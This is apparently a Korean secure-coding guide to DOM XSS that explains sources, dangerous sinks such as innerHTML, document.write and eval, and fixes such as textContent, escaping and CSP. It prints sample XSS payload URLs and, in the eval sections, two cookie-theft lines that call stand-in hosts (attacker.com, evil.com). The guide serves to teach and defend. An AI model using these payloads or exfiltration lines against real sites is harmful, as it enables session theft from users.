# DOM XSS: 위험한 함수(Sink)가 위험한 이유

## 📚 목차
1. [DOM XSS란?](#dom-xss란)
2. [Source와 Sink](#source와-sink)
3. [위험한 함수별 상세 설명](#위험한-함수별-상세-설명)
4. [실제 공격 예시](#실제-공격-예시)
5. [안전한 대안](#안전한-대안)

---

## DOM XSS란?

**DOM XSS (Cross-Site Scripting)**는 클라이언트 측 JavaScript 코드에서 사용자 입력을 안전하지 않게 처리할 때 발생하는 취약점입니다.

### 일반 XSS vs DOM XSS
- **일반 XSS**: 서버가 사용자 입력을 그대로 HTML에 삽입
- **DOM XSS**: 브라우저의 JavaScript가 사용자 입력을 DOM에 삽입

---

## Source와 Sink

### Source (사용자 입력 소스)
사용자가 제어할 수 있는 데이터의 출처:
- `location.hash` - URL의 `#` 뒤 부분
- `location.search` - URL의 `?` 뒤 쿼리 문자열
- `document.referrer` - 이전 페이지 URL
- `document.cookie` - 쿠키 값
- `localStorage`, `sessionStorage` - 저장된 데이터

### Sink (위험한 함수)
사용자 입력을 **안전하지 않게 처리**하는 함수들

---

## 위험한 함수별 상세 설명

### 1. `innerHTML` / `outerHTML` / `insertAdjacentHTML`

#### 왜 위험한가?
이 함수들은 **문자열을 HTML로 해석**하여 DOM에 삽입합니다. 사용자 입력에 `<script>` 태그나 이벤트 핸들러가 포함되면 **즉시 실행**됩니다.

#### 위험한 코드 예시:
```javascript
// ❌ 위험한 코드
var userInput = location.hash.substring(1); // URL의 # 뒤 부분
document.getElementById('content').innerHTML = userInput;
```

#### 공격 시나리오:
```
공격자가 만든 악성 URL:
https://example.com/page#<img src=x onerror=alert('XSS')>

사용자가 이 URL을 클릭하면:
1. location.hash = "#<img src=x onerror=alert('XSS')>"
2. innerHTML에 삽입됨
3. <img> 태그가 실행되고 onerror 이벤트 발생
4. alert('XSS') 실행 → XSS 공격 성공!
```

#### 실제 취약점 예시 (발견된 코드):
```javascript
// 취약점 #38에서 발견된 실제 코드
function getPath(){
    var path = window.location.pathname;
    var arrPath = path.split("/");
    return arrPath[1] || "front"
}

// 위험: pathname이 사용자 제어 가능하면 XSS 발생 가능
$head.insertAdjacentHTML("afterend", 
    "<link href='"+getContextPath()+"/plug-in/c2r/css/C2R.ModalLayer.css'/>"
);
```

만약 공격자가 URL을 조작할 수 있다면:
```
https://example.com/<img src=x onerror=alert(1)>/page
→ pathname = "/<img src=x onerror=alert(1)>/page"
→ insertAdjacentHTML에 삽입되면 XSS 발생!
```

---

### 2. `document.write()` / `document.writeln()`

#### 왜 위험한가?
이 함수들은 **페이지에 직접 HTML을 작성**합니다. 사용자 입력이 포함되면 악성 스크립트가 실행됩니다.

#### 위험한 코드 예시:
```javascript
// ❌ 위험한 코드
var searchTerm = location.search.split('=')[1]; // URL 파라미터
document.write('<h1>검색어: ' + searchTerm + '</h1>');
```

#### 공격 시나리오:
```
악성 URL:
https://example.com/search?q=<script>alert(document.cookie)</script>

실행 과정:
1. location.search = "?q=<script>alert(document.cookie)</script>"
2. document.write()로 HTML 작성
3. <script> 태그가 실행됨
4. 쿠키 탈취 → 세션 하이재킹!
```

---

### 3. `eval()`

#### 왜 위험한가?
`eval()`은 **문자열을 JavaScript 코드로 실행**합니다. 사용자 입력이 그대로 실행되면 **임의의 코드 실행**이 가능합니다.

#### 위험한 코드 예시:
```javascript
// ❌ 매우 위험한 코드
var userCode = location.hash.substring(1);
eval(userCode); // 사용자 입력을 그대로 실행!
```

#### 공격 시나리오:
```
악성 URL:
https://example.com/page#alert(document.cookie);fetch('http://attacker.com/steal?cookie='+document.cookie)

실행 과정:
1. location.hash = "#alert(document.cookie);fetch(...)"
2. eval()이 이 문자열을 JavaScript 코드로 실행
3. 쿠키가 공격자 서버로 전송됨
```

#### 실제 위험성:
- 쿠키 탈취
- 세션 하이재킹
- 피싱 페이지로 리다이렉트
- 키로거 설치
- 암호화폐 채굴 스크립트 실행

---

### 4. jQuery의 위험한 메서드

#### `jQuery.html()`, `jQuery.append()`, `jQuery.prepend()`

#### 왜 위험한가?
jQuery의 이 메서드들도 `innerHTML`과 동일하게 **HTML을 해석**합니다.

#### 위험한 코드 예시:
```javascript
// ❌ 위험한 코드
var userInput = location.search.split('=')[1];
$('#content').html(userInput); // innerHTML과 동일하게 위험!
```

#### 공격 시나리오:
```
악성 URL:
https://example.com/page?content=<svg onload=alert('XSS')>

실행:
1. location.search에서 content 파라미터 추출
2. jQuery.html()로 삽입
3. <svg> 태그의 onload 이벤트 실행
4. XSS 공격 성공!
```

---

## 실제 공격 예시

### 예시 1: location.hash → innerHTML

```javascript
// 취약한 코드
var hash = location.hash.substring(1);
document.getElementById('message').innerHTML = hash;
```

**공격 URL:**
```
https://example.com/page#<img src=x onerror=alert('XSS')>
```

**결과:** 이미지 로드 실패 시 `alert('XSS')` 실행

---

### 예시 2: location.search → document.write

```javascript
// 취약한 코드
var params = new URLSearchParams(location.search);
var name = params.get('name');
document.write('<h1>Hello, ' + name + '!</h1>');
```

**공격 URL:**
```
https://example.com/page?name=<script>alert(document.cookie)</script>
```

**결과:** 스크립트 실행, 쿠키 탈취 가능

---

### 예시 3: eval() 직접 실행

```javascript
// 매우 위험한 코드
var code = location.hash.substring(1);
eval(code);
```

**공격 URL:**
```
https://example.com/page#fetch('http://evil.com/steal?cookie='+document.cookie)
```

**결과:** 쿠키가 공격자 서버로 전송됨

---

## 안전한 대안

### 1. `innerHTML` 대신 `textContent` 사용

```javascript
// ❌ 위험
element.innerHTML = userInput;

// ✅ 안전
element.textContent = userInput;
```

**차이점:**
- `innerHTML`: HTML로 해석 → `<script>` 실행 가능
- `textContent`: 텍스트로만 처리 → HTML 태그가 그대로 표시됨

---

### 2. `document.write()` 대신 DOM API 사용

```javascript
// ❌ 위험
document.write('<div>' + userInput + '</div>');

// ✅ 안전
var div = document.createElement('div');
div.textContent = userInput;
document.body.appendChild(div);
```

---

### 3. `eval()` 대신 JSON.parse() 또는 다른 방법

```javascript
// ❌ 매우 위험
eval(userCode);

// ✅ 안전 (JSON 데이터인 경우)
var data = JSON.parse(userData);

// ✅ 안전 (동적 코드 실행이 필요한 경우)
// 가능한 한 피하고, 꼭 필요하면 sandbox 환경 사용
```

---

### 4. 입력 검증 및 이스케이프

```javascript
// ✅ 안전: 입력 검증
function escapeHtml(text) {
    var map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

var userInput = location.hash.substring(1);
element.innerHTML = escapeHtml(userInput); // 이스케이프 후 삽입
```

---

### 5. Content Security Policy (CSP) 사용

```html
<!-- HTML 헤더에 추가 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

**효과:**
- 인라인 스크립트 실행 방지
- 외부 스크립트 로드 제한
- XSS 공격 완화

---

## 요약

| 함수 | 위험도 | 이유 |
|------|--------|------|
| `innerHTML` | ⚠️ 높음 | HTML로 해석되어 스크립트 실행 가능 |
| `outerHTML` | ⚠️ 높음 | `innerHTML`과 동일 |
| `insertAdjacentHTML` | ⚠️ 높음 | HTML 삽입 시 스크립트 실행 가능 |
| `document.write()` | ⚠️ 높음 | 페이지에 직접 HTML 작성 |
| `eval()` | 🔴 매우 높음 | 임의 코드 실행 가능 |
| `jQuery.html()` | ⚠️ 높음 | `innerHTML`과 동일 |
| `textContent` | ✅ 안전 | 텍스트로만 처리 |
| `createElement()` | ✅ 안전 | DOM API 사용 |

---

## 핵심 정리

1. **위험한 함수들은 사용자 입력을 HTML/코드로 해석**합니다
2. **사용자 입력 + 위험한 함수 = XSS 취약점**
3. **항상 입력 검증 및 이스케이프**를 수행하세요
4. **가능한 한 안전한 대안**을 사용하세요 (`textContent`, DOM API 등)

